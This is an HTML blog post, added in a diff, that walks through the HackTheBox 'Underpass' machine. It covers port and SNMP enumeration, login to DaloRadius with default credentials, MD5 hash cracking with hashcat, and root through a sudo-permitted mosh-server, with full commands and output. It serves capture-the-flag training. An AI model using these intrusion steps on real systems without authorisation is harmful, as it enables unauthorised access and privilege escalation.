@@ -1,0 +1,263 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Underpass – Will Lindsey</title>
+  <meta name="description" content="A walkthrough of HackTheBox's Underpass – DaloRadius default credentials, hash cracking, and Mosh for root.">
+  <link rel="stylesheet" href="/css/style.css">
+  <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg'><text y='32' font-size='32'>💻</text></svg>">
+</head>
+<body>
+  <header>
+    <nav>
+      <a href="/" class="site-title">Will Lindsey</a>
+      <ul>
+        <li><a href="/">About</a></li>
+        <li><a href="/blog/">Blog</a></li>
+      </ul>
+    </nav>
+  </header>
+
+  <main>
+    <a href="/blog/" class="back-link">← Blog</a>
+    <div class="post-header">
+      <h1>Underpass</h1>
+      <div class="post-meta">
+        <time>Jun 14, 2025</time>
+        <span class="post-tags">
+          <span class="tag">hack-the-box</span>
+          <span class="tag">easy</span>
+          <span class="tag">mosh</span>
+        </span>
+      </div>
+    </div>
+
+    <article>
+      <p>The Underpass machine hosts a DaloRadius server with default credentials. Logging in reveals a username and a hashed password, which can be cracked to gain SSH access. Once on the machine, the user can launch a Mosh server as root and connect to it, ultimately gaining full root access.</p>
+
+      <h2>nmap scan</h2>
+
+      <p>First I run a basic nmap scan. This gives me a little time to manually enumerate common ports while the nmap scan that enumerates all ports and services versions runs.</p>
+
+<pre><code>┌──(kali㉿kali)-[~/htb/underpass/writeup]
+└─$ echo 10.10.11.48 > ip
+
+┌──(kali㉿kali)-[~/htb/underpass/writeup]
+└─$ echo underpass > box
+
+┌──(kali㉿kali)-[~/htb/underpass/writeup]
+└─$ mkdir nmap
+
+┌──(kali㉿kali)-[~/htb/underpass/writeup]
+└─$ sudo nmap $(cat ip) |tee nmap/$(cat box)_basic_namp.txt
+[sudo] password for kali:
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-11 21:21 EDT
+Nmap scan report for 10.10.11.48
+Host is up (0.081s latency).
+Not shown: 998 closed tcp ports (reset)
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+
+Nmap done: 1 IP address (1 host up) scanned in 1.00 seconds</code></pre>
+
+      <p>I run a nmap scan on all TCP ports and set flags <code>-sC</code> and <code>-sV</code> to enumerate services/versions and run default scripts. This scan shows Apache 2.4.52 running on the server and appears to be hosting some default content.</p>
+
+<pre><code>┌──(kali㉿kali)-[~/htb/underpass/writeup]
+└─$ sudo nmap -p- -sC -sV -oN nmap/$(cat box).all.tcp.ports $(cat ip)
+[sudo] password for kali:
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-13 15:36 EDT
+Nmap scan report for 10.10.11.48
+Host is up (0.040s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   256 48:b0:d2:c7:29:26:ae:3d:fb:b7:6b:0f:f5:4d:2a:ea (ECDSA)
+|_  256 cb:61:64:b8:1b:1b:b5:ba:b8:45:86:c5:16:bb:e2:a2 (ED25519)
+80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
+|_http-title: Apache2 Ubuntu Default Page: It works
+|_http-server-header: Apache/2.4.52 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 23.17 seconds</code></pre>
+
+      <h2>Enumerating port 80</h2>
+
+      <h3>website_enum</h3>
+      <p>I run a custom script to extract links and comments from the webpage, which reinforces the idea that this is a default Apache landing page.</p>
+
+<pre><code>┌──(kali㉿kali)-[~/htb/underpass/writeup]
+└─$ website_enum http://$(cat ip)
+~~~~~~~~Comments~~~~~~~~~~~~
+
+    Modified from the Debian original for Ubuntu
+    Last updated: 2022-03-22
+    See: https://launchpad.net/bugs/1966004
+
+~~~~~~END COMMENTS~~~~~~~~~~~
+~~~~~~~~LINKS~~~~~~~~~~~~~~~~
+https://bugs.launchpad.net/ubuntu/+source/apache2
+/manual
+http://httpd.apache.org/docs/2.4/mod/mod_userdir.html
+~~~~~~~~~ACTION BUTTONS~~~~~~</code></pre>
+
+      <h3>Inspect in Browser</h3>
+      <p>I navigate to <code>http://10.10.11.48</code> in my browser and find Apache2 Default Page for Ubuntu.</p>
+
+      <img src="/assets/img/underpass/1.png" alt="Apache default page" class="post-img">
+
+      <h3>Dirsearch</h3>
+      <p>I run <code>dirsearch</code> against the site, but it does not find anything interesting.</p>
+
+<pre><code>┌──(kali㉿kali)-[~/htb/underpass/writeup]
+└─$ dirsearch -u http://$(cat ip)
+  _|. _ _  _  _  _ _|_    v0.4.3
+ (_||| _) (/_(_|| (_| )
+
+Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460
+
+Target: http://10.10.11.48/
+
+[16:13:53] Starting:
+[16:13:58] 403 -  276B  - /.htaccess.bak1
+[16:13:58] 403 -  276B  - /.htaccess.orig
+[16:14:34] 403 -  276B  - /server-status
+[16:14:34] 403 -  276B  - /server-status/
+
+Task Completed</code></pre>
+
+      <h2>Checking SNMP udp 161</h2>
+
+      <h3>snmp-check</h3>
+      <p>At this stage, I haven't performed a full UDP port scan yet. However, I decide to probe for SNMP manually using <code>snmp-check</code>. The scan reveals some valuable information: a potential hostname <code>underpass.htb</code>, a username <code>steve</code>, and a running service called <code>daloradius</code>.</p>
+
+<pre><code>┌──(kali㉿kali)-[~/htb/underpass/writeup]
+└─$ snmp-check $(cat ip)
+snmp-check v1.9 - SNMP enumerator
+Copyright (c) 2005-2015 by Matteo Cantoni (www.nothink.org)
+
+[+] Try to connect to 10.10.11.48:161 using SNMPv1 and community 'public'
+
+[*] System information:
+
+  Host IP address               : 10.10.11.48
+  Hostname                      : UnDerPass.htb is the only daloradius server in the basin!
+  Description                   : Linux underpass 5.15.0-126-generic #136-Ubuntu SMP Wed Nov 6 10:38:22 UTC 2024 x86_64
+  Contact                       : steve@underpass.htb
+  Location                      : Nevada, U.S.A. but not Vegas
+  Uptime snmp                   : 00:48:15.72
+  Uptime system                 : 00:48:05.54
+  System date                   : 2025-6-13 20:17:37.0</code></pre>
+
+      <p>A full enumeration of the community string using <code>snmpwalk</code> doesn't find any additional interesting information. I add <code>underpass.htb</code> to my <code>/etc/hosts</code>.</p>
+
+      <h2>Returning to enumerate port 80</h2>
+
+      <h3>What is daloradius?</h3>
+      <p>At this point I was unable to find a valid subdomain, or any interesting paths. Daloradius was mentioned in the SNMP enumeration. Using google, I find a public <a href="https://github.com/lirantal/daloradius" target="_blank" rel="noopener noreferrer">daloradius</a> github repository. I navigate to <code>http://underpass.htb/daloradius</code> and discover it is a valid path.</p>
+
+      <img src="/assets/img/underpass/2.png" alt="DaloRadius landing page" class="post-img">
+
+      <p>Using the github repository as a guide I was able to identify two login portals.</p>
+
+      <p>Users Portal:</p>
+      <img src="/assets/img/underpass/3.png" alt="DaloRadius users portal" class="post-img">
+
+      <p>Operators Portal:</p>
+      <img src="/assets/img/underpass/4.png" alt="DaloRadius operators portal" class="post-img">
+
+      <p>I search online for daloradius default creds and find <code>administrator:radius</code>. These credentials work on the operators portal.</p>
+
+      <img src="/assets/img/underpass/5.png" alt="DaloRadius logged in" class="post-img">
+
+      <p>I click <code>Go to users list</code> and find a username <code>svcMosh</code> and what appears to be an md5 hash <code>412DD4759978ACFCC81DEAB01B382403</code>.</p>
+
+      <img src="/assets/img/underpass/6.png" alt="DaloRadius user list showing svcMosh" class="post-img">
+
+      <p>I use <code>hashcat</code> with MD5 mode to crack the hash. The password is <code>underwaterfriends</code>.</p>
+
+<pre><code>┌──(kali㉿kali)-[~/htb/underpass/writeup]
+└─$ hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt
+hashcat (v6.2.6) starting
+
+...
+
+412dd4759978acfcc81deab01b382403:underwaterfriends
+
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 0 (MD5)
+Time.Started.....: Sat Jun 14 17:38:11 2025 (2 secs)
+Time.Estimated...: Sat Jun 14 17:38:13 2025 (0 secs)
+Progress.........: 2985984/14344385 (20.82%)
+
+Started: Sat Jun 14 17:38:10 2025
+Stopped: Sat Jun 14 17:38:15 2025</code></pre>
+
+      <p>I am now able to login to ssh with the credentials <code>svcMosh:underwaterfriends</code>.</p>
+
+<pre><code>┌──(kali㉿kali)-[~/htb/underpass/writeup]
+└─$ ssh svcMosh@underpass.htb
+svcMosh@underpass.htb's password:
+Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-126-generic x86_64)
+
+Last login: Sat Jan 11 13:29:47 2025 from 10.10.14.62
+svcMosh@underpass:~$</code></pre>
+
+      <p>The user <code>svcMosh</code> grants access to the user flag on the box.</p>
+
+<pre><code>svcMosh@underpass:~$ ls -l
+total 4
+-rw-r----- 1 root svcMosh 33 Jun 13 19:30 user.txt
+svcMosh@underpass:~$ cat user.txt |wc
+      1       1      33</code></pre>
+
+      <h2>Root</h2>
+
+      <p>The user <code>svcMosh</code> can execute <code>mosh-server</code> as root.</p>
+
+<pre><code>svcMosh@underpass:~$ sudo -l
+Matching Defaults entries for svcMosh on localhost:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin,
+    use_pty
+
+User svcMosh may run the following commands on localhost:
+    (ALL) NOPASSWD: /usr/bin/mosh-server</code></pre>
+
+      <p>I did a little googling to get familiar with what <code>mosh-server</code> is. In short it is the server side component of Mosh (Mobile Shell). Mosh is a remote terminal application similar, but different from ssh. I figure I'll try to start the mosh server and then connect to the server.</p>
+
+<pre><code>svcMosh@underpass:~$ sudo mosh-server
+
+
+MOSH CONNECT 60001 JQJ+bacfXIVKqO8mTQeYMQ
+
+mosh-server (mosh 1.3.2) [build mosh 1.3.2]
+Copyright 2012 Keith Winstein &lt;mosh-devel@mit.edu&gt;
+License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;.
+
+[mosh-server detached, pid = 6398]
+svcMosh@underpass:~$ MOSH_KEY=JQJ+bacfXIVKqO8mTQeYMQ mosh-client 127.0.0.1 60001
+Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-126-generic x86_64)
+
+Last login: Sat Jan 11 13:29:47 2025 from 10.10.14.62
+
+root@underpass:~#</code></pre>
+
+      <p>Connecting to the Mosh server, I find that I am root on the machine!</p>
+
+<pre><code>root@underpass:~# id
+uid=0(root) gid=0(root) groups=0(root)
+root@underpass:~# cat root.txt |wc
+      1       1      33</code></pre>
+    </article>
+  </main>
+
+  <footer>
+    &copy; 2026 Will Lindsey
+  </footer>
+</body>
+</html>
